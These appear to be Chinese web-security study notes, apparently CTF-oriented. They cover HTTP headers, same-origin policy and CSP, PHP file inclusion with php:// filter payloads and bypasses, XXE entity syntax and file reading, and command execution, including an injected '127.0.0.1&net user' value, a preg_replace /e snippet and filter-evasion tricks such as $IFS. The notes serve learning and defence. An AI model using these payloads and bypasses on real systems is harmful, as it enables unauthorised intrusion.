<p>客户端通过TCP三次握手与服务器建立连接</p>
<p>TCP连接之后 向服务器发送HTTP请求</p>
<p>服务器接收到HTTP请求后 向客户端发送http响应</p>
<p>客户端通过TCP四次断开 与服务器断开TCP连接</p>
<p>请求头字段详情：<a class="link"   href="https://itbilu.com/other/relate/EJ3fKUwUx.html#http-request-headers" >https://itbilu.com/other/relate/EJ3fKUwUx.html#http-request-headers<i class="fas fa-external-link-alt"></i></a></p>
<p>请求头字段</p>
<ul>
<li><p>常见的请求方法：GET POST</p>
<p><code>Referer</code>这个可以表示你从哪个URL过来的</p>
<p><code>X-Forwarded-For</code>这个表示你从那个ip过来的</p>
<p><code>Client-IP</code>:和<code>X-Forwarded-For</code>类似</p>
<p><code>User-Agent</code>表示你从哪个操作系统或者哪个客户端（浏览器）过来的</p>
</li>
</ul>
<h4 id="浏览器安全"><a href="#浏览器安全" class="headerlink" title="浏览器安全"></a>浏览器安全</h4><ul>
<li><p>同源策略</p>
<p>同源指得是域名，协议端口相同。不同源的客户端脚本在没有明确授权的情况下，不能读写对方的资源。【例如你打开两个不同的网址 这两个网址之间不可以相互读写。</p>
<p>它是用来隔离两个网站的脚本混乱【例如 你打开一个京东的网址和百度的网址，可能京东的广告在百度的网址上出现了。</p>
</li>
<li><p>内容安全策略</p>
<p><code>Content-Security-Policy</code>:限定了可执行的内容</p>
<p>内容安全策略指的是 以白名单的形式配置可信任的内容来源</p>
<p>在网页中，能够使白名单的内容正常执行（包含：JS,CSS,Image）</p>
<p>而在非白名单的内容不可正常执行，从而减少了跨站脚本攻击（XSS）</p>
</li>
</ul>
<hr>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="前端基础"><a href="#前端基础" class="headerlink" title="前端基础"></a>前端基础</h3><p>看其他的博客去。</p>
<p> 跨站脚本攻击：<a class="link"   href="https://segmentfault.com/a/1190000017057646" >https://segmentfault.com/a/1190000017057646<i class="fas fa-external-link-alt"></i></a></p>
<p>。。。我看视频看的好迷。。。。</p>
<p>xss进阶实验</p>
<hr>
<h2 id="FileInclude"><a href="#FileInclude" class="headerlink" title="FileInclude"></a>FileInclude</h2><p><em>文件包含：为了更好的使用代码的重用性</em><br><em>引入了文件包含函数</em><br><em>比如<code>include(flag.php)</code></em><br><em>它可以把flag.php的文件代码放到该文件里面</em><br><em>如此使得代码的重用性增加了</em><br><em>不过</em><br><em><code>include($_GET)</code></em><br><em>里面是变量 可能被恶意改造</em></p>
<p>漏洞原因：<br>未对变量进行校验或者校验被绕过</p>
<ul>
<li><p>主要依靠四个PHP函数导致<br>include() PHP代码解析<br>include_once()<br>require()<br>require_once()</p>
<p>另外还有一些<br>file_get_contents()<br>读取文件内容</p>
</li>
</ul>
<p>简单的一个包含例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">....</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<h5 id="文件包含漏洞分类"><a href="#文件包含漏洞分类" class="headerlink" title="文件包含漏洞分类"></a>文件包含漏洞分类</h5><p>本地文件包含<br>远程文件包含</p>
<h5 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h5><p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20190917100424906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<ul>
<li>伪协议CTF使用：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=php_filter.php</span><br><span class="line">?file=php://filter/resource=http://www.example.com</span><br></pre></td></tr></table></figure>

<ul>
<li><p>file:&#x2F;&#x2F; 用于访问本地文件系统，在CTF中通常用来读取本地文件的</p>
<p>file:&#x2F;&#x2F; [文件的绝对路径和文件名]</p>
<p><a class="link"   href="http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt" >http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt<i class="fas fa-external-link-alt"></i></a></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://image.3001.net/images/20170925/15063200934739.png"
                      alt="img"
                ></p>
</li>
<li><p>php:&#x2F;&#x2F;协议</p>
<p>常用的协议是</p>
<p><code>php:??filter</code>用于读取源码    <code>?file=php://filter/read=convert.base64-encode/resource=./cmd.php</code></p>
<p><code>php://input</code>用于执行php代码    她可以将POST请求的数据作为PHP代码执行 常见的在getconvert</p>
</li>
</ul>
<h5 id="文件包含绕过"><a href="#文件包含绕过" class="headerlink" title="文件包含绕过"></a>文件包含绕过</h5><p>就是变量的输入被限制了</p>
<p>绕过的方式有：<br>1、00截断</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/tst.php?file=file:///c:/user/Thinking/desktop/flag.txt%00</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>2、点加斜杆绕过<br>（过滤了.php文件）<br>加点和斜杆来补充尾巴<br>那种判断文件名后四位是不是<code>.php</code>的函数<br>可以利用<br><code>· / 或者 /.</code></p>
<p>3、去掉后缀名绕过</p>
<p>4、双写绕过<br>双写绕过的意义在于<br>函数判断是否有这样的字符串<code>../</code>等等<br>有的话 把它变成空格。</p>
<p>比如过滤了…&#x2F;<br>那么可以这么写<code>..././</code>，这样会把中间的<code>../</code>过滤掉<br>这样就可以过滤掉这个函数</p>
<p>PS：<br>在SQL注入中<br>也有双写注入 ， 比如过滤了union ，我们可以写成 uniunionon;</p>
<p>5、文件包含写shell</p>
<hr>
<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>大师傅的博客：<a class="link"   href="https://mature-sec.com/post/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" >https://mature-sec.com/post/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="XML介绍："><a href="#XML介绍：" class="headerlink" title="XML介绍："></a>XML介绍：</h3><p>XML是一种用于标记电子文件使其具有结构性的可扩展标记语言</p>
<p><code>XtensibleMarkup Language</code>,可扩展标记语言，使用简单的标记来描述数据</p>
<p>xml是一种非常灵活的语言，类似于HTML语言，但是并没有固定的标签，所有的标签都可以自定义，其设计的宗旨是传输数据，而不是像HTML一样显示数据。</p>
<p>数据传输的载体</p>
<p>XML不会做任何事情，他是呗设计用来结构化、存储以及传输信息，也就是xml文件所携带的信息，需要被其他的语言或者程序来解析，才能发挥作用。</p>
<h3 id="XML的用处"><a href="#XML的用处" class="headerlink" title="XML的用处"></a>XML的用处</h3><p>通常，xml被用于信息的记录和传递(比如，数据库的导出导入会很麻烦，但是xml会很方便)，也会被用于充当配置文件。也会被应用于Web 开发的许多方面，常用于简化数据的存储和共享。如：</p>
<p>XML 把数据从 HTML 分离，更方便在HTML文档中显示动态数据。</p>
<p> XML 简化数据共享，XML数据以纯文本格式进行存储，因此提供了一种独立于软件和硬件的数据存储方法。这让创建不同应用程序可以共享的数据变得更加容易。</p>
<p>XML 简化数据传输，由于可以通过各种不兼容的应用程序来读取数据，以 XML 交换数据降低了不兼容系统之间交换书据的复杂性。</p>
<p>XML 简化平台变更，使用XML存储一些不兼容的数据，可以在系统或软件升级，转换大量的数据时，避免数据的丢失。</p>
<p>XML 使您的数据更有用，XML可以使不同的应用程序都能够访问您的数据，使得数据的用途更广。</p>
<p>XML 用于创建新的互联网语言，如XHTML、WSDL、WAP 和 WML、RSS 、RDF 和 OWL等</p>
<h3 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h3><ul>
<li>XML文档中有且只有一个根元素</li>
<li>XML元素都必须有一个关闭标签</li>
<li>XML标签对大小写敏感</li>
<li>XML元素必须被正确的嵌套</li>
<li>XML属性值必须加引号</li>
</ul>
<p>它没有固定的标签</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="DTD-文档类型定义"><a href="#DTD-文档类型定义" class="headerlink" title="DTD 文档类型定义"></a>DTD 文档类型定义</h3><p>用来为XML文档定义语义约束</p>
<p>1、我们可以理解为一个模板，这个模板定义了用户自己</p>
<p>创建的根元素以及对应的子元素和根元素的合法元素和属性</p>
<p>2、而文档元素则必须以我们的DTD为模板，来对XML的元素的</p>
<p>内容进行相应的规范化。</p>
<p>DTD分为内部和外部两种。DTD定义在xml文件中视为内部DTD；</p>
<p>DTD定义在外部的dtd文件中，视为外部DTD。</p>
<h4 id="DTD声明"><a href="#DTD声明" class="headerlink" title="DTD声明"></a>DTD声明</h4><p>内部声明：DTD被包含在XML源文件中，应当使用下面的语法包装在一个DOCTYPE声明中：</p>
<p>语法：<!DOCTYPE  根元素  [元素声明] ></p>
<p>例子：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--这里是注释--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">books</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">books</span> (<span class="keyword">book</span>+)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">book</span> (<span class="keyword">name</span>,<span class="keyword">author</span>,<span class="keyword">price</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ATTLIST <span class="keyword">book</span> <span class="keyword">id</span> <span class="keyword">CDATA</span> <span class="keyword">#REQUIRED</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">name</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">author</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">price</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">books</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">book</span> <span class="attr">id</span>=<span class="string">&quot;b01&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Python黑客编程从入门到入狱<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">author</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">price</span>&gt;</span>$20.00<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">books</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如上，就是一个内部DTD的引用示例，在DTD定义中，要求根元素books的子元素book出现一次及以上，子元素book又有三个子元素，分别为name，author和price，然后声明了元素book的id属性，其类型是CDATA，并且是必须的（#REQUIRED），最后定义了book的三个子元素的数据类型为#PCDATA，这表示这三个元素标签中的内容必须是文本，并能再出现子标签。</p>
<p>外部声明：假如DTD位于XML源文件的外部，应当使用下面的语法封装在一个DOCTYPE定义中</p>
<p>语法：<!DOCTYPE  根元素  SYSTEM "文件名"></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200302183948377.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="外部声明"
                ></p>
<h4 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h4><p>指的是被解析的字符数据</p>
<p>XML解析器通常会解析XML文档中所有的文本</p>
<h4 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h4><p>CDATA 由“&lt;![CDATA [“开始，   由”]]&gt;” 结束</p>
<p>指的是不应由XML解析器进行解析的文本数据</p>
<p>CDATA部分中的所有内容都会被解析器忽略</p>
<h3 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a><em>DTD实体</em></h3><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量</p>
<p>实体就像是变量，可以用于存储数据，以便后续的使用。</p>
<p>但它的功能又不仅仅是存储。</p>
<p>比如外部实体，除了可以存储数据，还可以从远程文件或远程网络中读取内容或调用数据。至于什么是外部实体，别着急，接着往后看。</p>
<p>从实体被定义的位置来看，实体可以分为内部实体和外部实体。</p>
<p>就像内部DTD和外部DTD一样，内部实体，就是在XML文档内部的DTD进行定义的实体，外部实体就是定义在外部DTD文件中然后被引用到当前XML中的实体。</p>
<h4 id="内部普通实体："><a href="#内部普通实体：" class="headerlink" title="内部普通实体："></a>内部普通实体：</h4><p>​		声明 ： <!ENTITY 实体名称  "实体名称" ></p>
<p>​		引用： 一个实体的引用，由三部分构成： &amp;符号，实体名 ， 分号。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">books</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="string">&quot;Hello World&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">books</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">books</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="外部普通实体"><a href="#外部普通实体" class="headerlink" title="外部普通实体"></a>外部普通实体</h4><p>声明： <!ENTITY 实体名称 SYSTEM "URL/URL"></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200302183959395.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="外部普通实体"
                ></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">books</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost/xmltest.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">books</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">books</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h4><p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200302184013857.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="参数实体"
                ></p>
<h3 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h3><p>XML与HTML一样，也存在注入漏洞。比如：一个 web 应用，在进行用户注册时，选择以 xml 来存储数据到 xmldb 数据库中，当用户填写用户名，密码和邮箱时，后台存储的文件格式及内容如下：</p>
<p>   <img  
                     lazyload
                     alt="image"
                     data-src="http://www.hetianlab.com/headImg.action?guideImg=/7f2cef17-3494-4a3a-828c-64159c035811.png"
                      alt="img"
                ></p>
<p>那么攻击者就可以在注册的时候构造恶意的数据，假设他在用户名与密码的输入框中输入正常的文本，在最后的邮箱输入框中输入如下内容：</p>
<p>   <img  
                     lazyload
                     alt="image"
                     data-src="http://www.hetianlab.com/headImg.action?guideImg=/08894e79-3fec-4d93-9e18-9a0c290dd8e3.png"
                      alt="img"
                ></p>
<p>那么就会多注册一个名为admin的用户。</p>
<p>综合上面的小例子，我们可以知道,能够进行XML注入攻击的前提是，用户能够控制数据的输入，程序没有对输入的内容进行过滤且拼接了数据。那么相应的，破坏掉其中一个前提就可以进行防御了，既然我们无法限制用户的输入，那么就可以对数据进行过滤，将XML语言本身的“保留字符”进行过滤或者转意即可。</p>
<hr>
<h3 id="XXE-即SML外部实体注入攻击"><a href="#XXE-即SML外部实体注入攻击" class="headerlink" title="XXE 即SML外部实体注入攻击"></a>XXE 即SML外部实体注入攻击</h3><p>是一种web常见的安全漏洞，发生在应用程序解析XML输入时，没有</p>
<p>禁止外部实体的加载，导致了攻击者可以通过XML的外部实体获取服务器中本应被保护的数据</p>
<h4 id="产生原因："><a href="#产生原因：" class="headerlink" title="产生原因："></a>产生原因：</h4><p>在文档类型定义部分，可以引用外部的DTD文件，所以这里容易出现安全问题。</p>
<p>XML解析器解析外部实体支持多种协议。如：使用f<code>ile</code>协议可以读取本地文件内容</p>
<p>使用<code>http</code>协议可以获取web资源</p>
<p>因此 攻击者可以构建恶意的外部实体，当解析器解析了包含恶意的外部实体的XML文件时</p>
<p>就出现了XXE攻击。	</p>
<h4 id="XXE的利用场景"><a href="#XXE的利用场景" class="headerlink" title="XXE的利用场景"></a>XXE的利用场景</h4><p>一般分为两大场景</p>
<p>有回显和无回显</p>
<p>有回显的情况下 我们可以直接在页面种中看到payload的执行结果或现象（带内XML外部实体）</p>
<p>即攻击者可以发送带有XXE有效负载的请求并从包含某些数据的web应用程序获取响应</p>
<p>无回显的情况 可以使用外带数据通道提取数据即带外XML外部实体</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200302185015556.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="-------------"
                ></p>
<hr>
<h3 id="有回显的本地文件读取"><a href="#有回显的本地文件读取" class="headerlink" title="有回显的本地文件读取"></a><strong>有回显的本地文件读取</strong></h3><p>   漏洞示例代码：</p>
<p>   <img  
                     lazyload
                     alt="image"
                     data-src="http://www.hetianlab.com/headImg.action?guideImg=/1eee747b-b70b-46e5-98d7-5980ae71014f.png"
                      alt="img"
                ></p>
<p>   测试payload：</p>
<p>   <img  
                     lazyload
                     alt="image"
                     data-src="http://www.hetianlab.com/headImg.action?guideImg=/5ef5ec0a-2adb-4a9f-8af6-b3131204bafe.png"
                      alt="img"
                ></p>
<p>   在浏览器中设置代理，打开burpsuite访问存在漏洞的页面：“xxetest.php”，并抓包，然后发送到Repeater中，构造请求包：</p>
<p>   <img  
                     lazyload
                     alt="image"
                     data-src="http://www.hetianlab.com/headImg.action?guideImg=/62d3bd12-eefa-4b0c-9157-2e3e21f9c8a9.png"
                      alt="img"
                ></p>
<p>​	这样我们就读取到了windows系统的system.ini的文件内容。</p>
<p>   但是这样也不代表这个payload的就适用于任何情况，比如我们更换一个读取的文件xmltest2.txt，内容是：</p>
<p>   <img  
                     lazyload
                     alt="image"
                     data-src="http://www.hetianlab.com/headImg.action?guideImg=/bb5ba17f-5f4c-44ed-8c3d-12ca72690c4b.png"
                      alt="img"
                ></p>
<p>   我们再使用刚才的payload测试：</p>
<p>   <img  
                     lazyload
                     alt="image"
                     data-src="http://www.hetianlab.com/headImg.action?guideImg=/48198e19-ef71-45f6-9026-dc63e706473b.png"
                      alt="img"
                ></p>
<p>   这个时候就会如上图一样，报很多错误，主要是因为我们要读取的文件内容中存在很多的特殊字符：大于号、小于号等，我们在前面的XML基础巩固中也提到过，当xml的标签内还存在小于号、大于号等特殊字符时，尤其是小于号，会被XML解析器误认为是另一个标签的开始，这样就会造成解析的错误。所以我们的问题是：</p>
<p>   <img  
                     lazyload
                     alt="image"
                     data-src="http://www.hetianlab.com/headImg.action?guideImg=/52bacae0-48d7-486d-a49c-09df72c68213.png"
                      alt="img"
                ></p>
<p>   所以我们就要想办法绕过。这个时候我们就需要了解一下XML CDATA了，我们先看一下w3school中对他的描述：</p>
<p>   <img  
                     lazyload
                     alt="image"
                     data-src="http://www.hetianlab.com/headImg.action?guideImg=/09be709a-34bd-4832-a7f9-3f94abd208e9.png"
                      alt="img"
                ></p>
<p>   其实只用看一个开始，我们就大概知道CDATA的作用了，它可以使得使用其中的数据内容不会被xml解析器解析。然后我们再看其使用方式：</p>
<p>   <img  
                     lazyload
                     alt="image"
                     data-src="http://www.hetianlab.com/headImg.action?guideImg=/7c01d25c-9bf6-42f2-b99f-31c4503bbe41.png"
                      alt="img"
                ></p>
<p>   从w3school给出的例子，我们也大概知道了CDATA的使用方式，但是其还需要注意几点：</p>
<p>   a. CDATA 部分不能包含字符串 “]]&gt;”。也不允许嵌套的 CDATA 部分，这样会导致异常的闭合，从而使解析器报错。</p>
<p>   b. 标记 CDATA 部分结尾的 “]]&gt;” 不能包含空格或换行。</p>
<p>   那么了解了这些，我们就可以尝试使用CDATA再次去读取目标文件的内容，我们首先需要把要读取的到的内容放在CDATA中，但是CDATA并没有提供拼接的方法，所以我们暂且使用普通实体进行拼接尝试（注意是尝试）：</p>
<p>   <img  
                     lazyload
                     alt="image"
                     data-src="http://www.hetianlab.com/headImg.action?guideImg=/55dfd86c-a46f-4b65-a34e-dc60e2e1067c.png"
                      alt="img"
                ></p>
<p>   我们尝试直接使用实体来进行拼接，但是测试失败：</p>
<p>   <img  
                     lazyload
                     alt="image"
                     data-src="http://www.hetianlab.com/headImg.action?guideImg=/eba2fc1b-faba-4170-a75b-3eeb6f314848.png"
                      alt="img"
                ></p>
<p>   这说明我们的拼接方式不可行，我们现在使用的是一般实体，我们在前面的xml基础知识中介绍过了，一般实体的引用是在xml文档内容中，既然在xml文档内容中拼接不可行，那再dtd中拼接可行吗？我们再次进行尝试，既然再dtd中拼接，那就需要用到参数实体了。</p>
<p>   我们再次尝试构造payload：</p>
<p>   <img  
                     lazyload
                     alt="image"
                     data-src="http://www.hetianlab.com/headImg.action?guideImg=/c954ed86-0f20-455b-952d-d3effc5315cb.png"
                      alt="img"
                ></p>
<p>   理论上，我们完美地将这几个参数实体拼接了起来，并将值赋给了一般实体all，但是遗憾的是，我们的payload还是报错了：</p>
<p>   <img  
                     lazyload
                     alt="image"
                     data-src="http://www.hetianlab.com/headImg.action?guideImg=/697e6d68-cfc4-409e-ad82-c3dc3aa1d976.png"
                      alt="img"
                ></p>
<p>   那么这又是为什么呢？根据XML规范所描述：“在DTD内部子集中的参数实体调用，不能混掺到标记语言中”，这是什么意思呢？就是不能在实际的标记语言中来调用参数实体，像我们这样，就是在标记语言中进行调用：</p>
<p>   <img  
                     lazyload
                     alt="image"
                     data-src="http://www.hetianlab.com/headImg.action?guideImg=/34c0d65e-ffa5-4fed-8683-3cd86c03e5dd.png"
                      alt="img"
                ></p>
<p>   但可以在同级别中被当作标记语言调用，就像是参数实体的引用，就是将调用当成了一个标记语言，像这样：</p>
<p>   <img  
                     lazyload
                     alt="image"
                     data-src="http://www.hetianlab.com/headImg.action?guideImg=/b774add3-adcb-40f6-aaca-3ff855c40b12.png"
                      alt="img"
                ></p>
<p>   也就是我们所构造的payload这种使用方式，不能在内部DTD中被这样使用，但是幸运的是，XML规范还声明了一点：“外部参数实体不受此限制”，这就告诉我们可以使用外部的DTD来构造payload，将我们的CDATA内容拼接起来：</p>
<p>   <img  
                     lazyload
                     alt="image"
                     data-src="http://www.hetianlab.com/headImg.action?guideImg=/6a2604c2-cbbe-4f48-95e5-166e1f55a265.png"
                      alt="img"
                ></p>
<p>   DTD文件的内容：</p>
<p>   <img  
                     lazyload
                     alt="image"
                     data-src="http://www.hetianlab.com/headImg.action?guideImg=/7395ec9a-0c90-4e4e-8438-21f6b2fdcf24.png"
                      alt="img"
                ></p>
<p>   我们再次进行攻击尝试，成功读取到文件内容：</p>
<p>   <img  
                     lazyload
                     alt="image"
                     data-src="http://www.hetianlab.com/headImg.action?guideImg=/26fb0f38-26b6-4c06-927a-408344b98a45.png"
                      alt="img"
                ></p>
<p>   Ps：</p>
<p>   由于环境资源的关系，我们在进行攻击时，所使用的外部dtd文件，是本地环境的。但是在实际的攻击情况下，这个DTD文件应该是我们自己所掌握的主机的DTD文件，文件的内容是受我们所控的。</p>
<hr>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="命令执行漏洞简介"><a href="#命令执行漏洞简介" class="headerlink" title="命令执行漏洞简介"></a>命令执行漏洞简介</h3><p>什么是命令执行 ：未对用户输入进行严格过滤 </p>
<p>其危害:</p>
<p>继承Web服务程序的权限去执行系统命令或读写文件</p>
<p>反弹shell，获得目标服务器的权限</p>
<p>进一步内网渗透</p>
<p>远程命令执行</p>
<p>常见的PHP:<code>eval() assert() preg_replace() creatr_function()</code>函数</p>
<p><code>eval() assert()</code>可以执行参数的代码，且接受的参数时字符串</p>
<p><code>eval</code>要求其传入的参数必须为PHP代码，就是要求以分号结尾</p>
<p><code>assert</code>是直接把传入的参数当作代码 可以直接执行 不强制要求分号</p>
<p><code>preg_replace()</code>其参数形式：<code>(&#39;正侧规则&#39;，&#39;替换字符&#39;,&#39;目标字符&#39;)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	preg_replace(&#x27;/test/e&#x27;,$_POST[&#x27;cmd&#x27;],&#x27;just test&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><code>array_map()</code>：其参数<code>(函数，命令)   ---(function,cmd)  (assert,phpinfo())</code></p>
<p>系统命令执行&#x2F;本地命令执行</p>
<p>常见函数有;;<code>system() exec() shell_exec() passthru() penti-exec() popen() proc-pen()</code></p>
<p><code>system()</code>：执行外部程序，并且显示输出</p>
<p><code>exec()</code>:执行外部程序</p>
<p><code>shell-exec()</code>：通过shell环境执行命令，并且将完整的输出以字符串的方式返回</p>
<p><code>passthru()</code>：执行linux系统命令并且显示原始输出</p>
<h3 id="系统常用命令执行的特殊字符"><a href="#系统常用命令执行的特殊字符" class="headerlink" title="系统常用命令执行的特殊字符"></a>系统常用命令执行的特殊字符</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cms1|cmd2  无论怎样cmd2都会执行</span><br><span class="line">cmd1;cmd2	无论怎样cmd2都会执行</span><br><span class="line">cmd1||cmd2	cmd1执行失败时才执行cmd2</span><br><span class="line">cmd1&amp;&amp;cmd2   仅在<span class="built_in">cmd</span>执行成功后才可以执行cmd2</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&amp;<span class="built_in">net</span> user  IP和<span class="built_in">net</span> user都可以执行并全部输出</span><br><span class="line">&gt;(cnmd): &lt;(ls)</span><br><span class="line">&lt;(<span class="built_in">cmd</span>: &gt;(ls)</span><br></pre></td></tr></table></figure>

<p>命令执行时常见的绕过手段</p>
<h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a=l;b=s;$a<span class="variable">$b</span></span><br></pre></td></tr></table></figure>

<h4 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h4><p>空格可以用以下字符串代替：</p>
<p><code>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125;、$IFS等</code></p>
<h4 id="一些命令分隔符"><a href="#一些命令分隔符" class="headerlink" title="一些命令分隔符"></a>一些命令分隔符</h4><p>linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||<br>windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</p>
<p>1、在 shell 中，担任”连续指令”功能的符号就是”;”<br>2、”&amp;” 放在启动参数后面表示设置此进程为后台进程，默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’&amp;’实现这个目的。<br>3、管道符”|”左边命令的输出就会作为管道符右边命令的输入，所以左边的输出并不显示</p>
<p><strong>在Linux bash中还可以使用<code>&#123;OS_COMMAND,ARGUMENT&#125;</code>来执行系统命令</strong></p>
